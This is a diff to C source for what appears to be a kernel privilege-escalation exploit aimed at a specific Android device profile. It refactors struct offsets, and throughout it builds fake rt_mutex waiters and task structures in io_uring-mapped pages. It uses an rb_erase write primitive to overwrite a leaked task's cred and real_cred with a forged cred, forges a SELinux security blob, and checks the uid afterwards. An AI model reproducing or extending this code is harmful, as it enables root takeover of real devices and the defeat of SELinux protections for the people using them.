@@ -55,12 +55,24 @@ static int print_profile_info(const char *release_override) {
   printf("stack_overlay_route=%s\n",
          profile->stack_overlay_route == GHOST_STACK_OVERLAY_TCL_V643_PSELECT6 ?
              "tcl-v643-pselect6" : "seqpacket");
+  printf("reclaim_route=%s\n",
+         profile->reclaim_route == GHOST_RECLAIM_TCL_V643_UNPROVEN ?
+             "tcl-v643-unproven" : "reference-sabrina");
   printf("analysis_blocker=%s\n",
          profile->analysis_blocker ? profile->analysis_blocker : "");
   printf("kimage_text_base=0x%016llx\n",
          (unsigned long long)profile->kimage_text_base);
   printf("phys_offset=0x%016llx\n",
          (unsigned long long)profile->phys_offset);
+  printf("page_offset=0x%016llx\n",
+         (unsigned long long)profile->page_offset);
+  printf("direct_map=0x%016llx..0x%016llx\n",
+         (unsigned long long)profile->direct_map_base,
+         (unsigned long long)profile->direct_map_end);
+  printf("vmemmap_start=0x%016llx\n",
+         (unsigned long long)profile->vmemmap_start);
+  printf("mm_struct_size=%u\n", profile->mm_struct_size);
+  printf("mm_slab_order=%u\n", profile->mm_slab_order);
   printf("kernel_phys_load=0x%016llx\n",
          (unsigned long long)profile->kernel_phys_load);
   printf("primitive_arming=%s\n",
@@ -257,15 +269,15 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         /* Retarget walk 0 to consumer's real_cred if we have our task */
         if (calls_this_seq == 0 && write_mode_is_cred(pselect_custom_write) &&
             g_consumer_task) {
-          uintptr_t cpc = (g_consumer_task + TASK15_REAL_CRED_OFF - 8) | 1;
+          uintptr_t cpc = (g_consumer_task + TASK_REAL_CRED_OFF - 8) | 1;
           for (int b2 = 0; ; b2++) {
             uint8_t *pg2 = uring_block(b2);
             if (!pg2) break;
-            put64(pg2, W0_OFF + 0x18, cpc);
+            put64(pg2, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF, cpc);
           }
           char m3[96];
           int n3 = snprintf(m3, sizeof(m3), "[RETARGET] walk 0 -> consumer real_cred %016lx\n",
-                            (unsigned long)(g_consumer_task + TASK15_REAL_CRED_OFF));
+                            (unsigned long)(g_consumer_task + TASK_REAL_CRED_OFF));
           write(1, m3, n3);
         }
         {
@@ -294,17 +306,22 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         /* Check ALL uring payload blocks for walk modification */
         if (write_mode_is_cred(pselect_custom_write)) {
           int found = -1;
-          uint64_t expected_armed = *(volatile uint64_t *)((uint8_t *)uring_sqes + W0_OFF + 0x18);
+          uint64_t expected_armed = *(volatile uint64_t *)(
+              (uint8_t *)uring_sqes + W0_OFF +
+              FAKE_WAITER_PI_TREE_ENTRY_OFF);
           for (int bi = 0; ; bi++) {
             uint8_t *pg = uring_block(bi);
             if (!pg) break;
-            uint64_t pc_i = *(volatile uint64_t *)(pg + W0_OFF + 0x18);
+            uint64_t pc_i = *(volatile uint64_t *)(
+                pg + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF);
             if (pc_i != expected_armed) { found = bi; break; }
           }
           char mc[128];
           int nc2;
           if (found >= 0) {
-            uint64_t pc_f = *(volatile uint64_t *)(uring_block(found) + W0_OFF + 0x18);
+            uint64_t pc_f = *(volatile uint64_t *)(
+                uring_block(found) + W0_OFF +
+                FAKE_WAITER_PI_TREE_ENTRY_OFF);
             g_hit_block = found;
             nc2 = snprintf(mc, sizeof(mc), "[WALKCHK %d] FOUND on block %d pc=%016llx\n",
                            calls_this_seq, found, (unsigned long long)pc_f);
@@ -313,8 +330,10 @@ void *consumer_thread(void *arg __attribute__((unused))) {
              * mapping that backs the leaked mm page. Only count a hit when
              * the pre-walk state was the armed plan (not already the
              * marker), so no-op calls can not double-count. */
-            if (pc_f == (uint64_t)(page_base + W0_OFF + 0x18) &&
-                expected_armed != (uint64_t)(page_base + W0_OFF + 0x18)) {
+            if (pc_f == (uint64_t)(page_base + W0_OFF +
+                                   FAKE_WAITER_PI_TREE_ENTRY_OFF) &&
+                expected_armed != (uint64_t)(page_base + W0_OFF +
+                                             FAKE_WAITER_PI_TREE_ENTRY_OFF)) {
               int hits = atomic_fetch_add(&consumer_erase_hits, 1) + 1;
               char hm[96];
               int hn = snprintf(hm, sizeof(hm), "[ERASE %d] rb_erase write landed (hits=%d/%d)\n",
@@ -357,10 +376,12 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         if (write_mode_is_cred(pselect_custom_write) && calls_this_seq == 0 &&
             uring_count > 64) {
           uint8_t *m64 = (uint8_t *)uring_maps[64];
-          uint32_t w0_prio = *(uint32_t *)(m64 + W0_OFF + 0x44);
-          uint64_t w0_pc = *(uint64_t *)(m64 + W0_OFF + 0x18);
-          uint64_t lk_root = *(uint64_t *)(m64 + LOCK_OFF + 0x08);
-          uint64_t lk_left = *(uint64_t *)(m64 + LOCK_OFF + 0x10);
+          uint32_t w0_prio = *(uint32_t *)(m64 + W0_OFF + FAKE_WAITER_PRIO_OFF);
+          uint64_t w0_pc = *(uint64_t *)(m64 + W0_OFF +
+                                        FAKE_WAITER_PI_TREE_ENTRY_OFF);
+          uint64_t lk_root = *(uint64_t *)(m64 + LOCK_OFF + RT_MUTEX_WAITERS_OFF);
+          uint64_t lk_left = *(uint64_t *)(m64 + LOCK_OFF +
+                                          RT_MUTEX_WAITERS_OFF + 8);
           uint64_t pi_root = *(uint64_t *)(m64 + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF);
           char dm[192];
           int dn = snprintf(dm, sizeof(dm),
@@ -393,12 +414,15 @@ void *consumer_thread(void *arg __attribute__((unused))) {
               /* NULL W0 children */
               *(volatile uint64_t *)(pg + W0_OFF + 0x08) = 0;
               *(volatile uint64_t *)(pg + W0_OFF + 0x10) = 0;
-              *(volatile uint64_t *)(pg + W0_OFF + 0x20) = 0;
-              *(volatile uint64_t *)(pg + W0_OFF + 0x28) = 0;
+              *(volatile uint64_t *)(pg + W0_OFF +
+                                     FAKE_WAITER_PI_TREE_ENTRY_OFF + 8) = 0;
+              *(volatile uint64_t *)(pg + W0_OFF +
+                                     FAKE_WAITER_PI_TREE_ENTRY_OFF + 16) = 0;
               /* Clean tree roots + owner */
-              *(volatile uint64_t *)(pg + LOCK_OFF + 0x08) = 0;
-              *(volatile uint64_t *)(pg + LOCK_OFF + 0x10) = 0;
-              *(volatile uint64_t *)(pg + LOCK_OFF + 0x18) = 0;
+              *(volatile uint64_t *)(pg + LOCK_OFF + RT_MUTEX_WAITERS_OFF) = 0;
+              *(volatile uint64_t *)(pg + LOCK_OFF +
+                                     RT_MUTEX_WAITERS_OFF + 8) = 0;
+              *(volatile uint64_t *)(pg + LOCK_OFF + RT_MUTEX_OWNER_OFF) = 0;
               *(volatile uint64_t *)(pg + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF) = 0;
               *(volatile uint64_t *)(pg + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8) = 0;
               /* Repair uid/gid */
@@ -685,9 +709,9 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
      * (commit_creds at exec BUG_ONs unless cred == real_cred, so both
      * pointer writes are required before any execve). Three erases fit
      * the three rungs of the nice ladder: 0->7, 7->14, 14->19. */
-    ghost_push_plan(g_leaked_task + TASK15_CRED_OFF,
+    ghost_push_plan(g_leaked_task + TASK_CRED_OFF,
                     page_base + FAKE_CRED_OFF);
-    ghost_push_plan(g_leaked_task + TASK15_REAL_CRED_OFF,
+    ghost_push_plan(g_leaked_task + TASK_REAL_CRED_OFF,
                     page_base + FAKE_CRED_OFF);
     pr_info("  walk0: selinux zero, walk1: cred, walk2: real_cred, "
             "fake_cred=%016zx plans=%d\n",
@@ -968,13 +992,13 @@ static void raw_wdec(long fd, long v) {
 
 /* ---- crash-free SID resolution helpers (post-walk: raw syscalls only) ---
  * The fake security blob lives on the reclaim page at FAKE_SEC_BLOB_OFF;
- * blob->sid (+4) is re-read by the kernel on every SELinux hook, so the
+ * blob->sid (profile-selected; +4 on V643) is re-read by the kernel on every SELinux hook, so the
  * parent can steer current_sid() through the uring mapping. Verification
  * reads /proc/self/attr/current (self-attr read takes NO avc check, just
  * sid -> context string). The old 32K-openat brute force panicked the
  * device; these helpers back the candidate-first + bounded-scan flow. */
 static void blob_set_sid(uint8_t *page, uint32_t sid) {
-  for (int f = 0; f < 24; f += 4)
+  for (unsigned f = 0; f < TASK_SECURITY_SIZE; f += 4)
     *(volatile uint32_t *)(page + FAKE_SEC_BLOB_OFF + f) = sid;
   __atomic_thread_fence(__ATOMIC_SEQ_CST);
 }
@@ -2111,7 +2135,7 @@ static int run_cred_swap(void) {
     /* Mode 7 targets selinux_state first (the cred plans are pushed
      * inside do_one_write); mode 6 targets task->cred directly. */
     if (!do_one_write(selinux_mode ? g_selinux_target
-                                   : g_leaked_task + TASK15_CRED_OFF,
+                                   : g_leaked_task + TASK_CRED_OFF,
                       selinux_mode ? "selinux+cred swap" : "cred swap",
                       selinux_mode ? WRITE_MODE_CRED_SELINUX : 6)) continue;
     uint32_t uid_now = syscall(__NR_getuid);
@@ -2258,7 +2282,8 @@ static int run_cred_swap(void) {
 
           /* Page r/w sanity (diagnostic) */
           volatile uint32_t *sec_sid =
-              (volatile uint32_t *)(hit_page + FAKE_SEC_BLOB_OFF + 4);
+              (volatile uint32_t *)(hit_page + FAKE_SEC_BLOB_OFF +
+                                    TASK_SECURITY_SID_OFF);
           uint32_t before = *sec_sid;
           *sec_sid = 0xDEAD;
           __atomic_thread_fence(__ATOMIC_SEQ_CST);
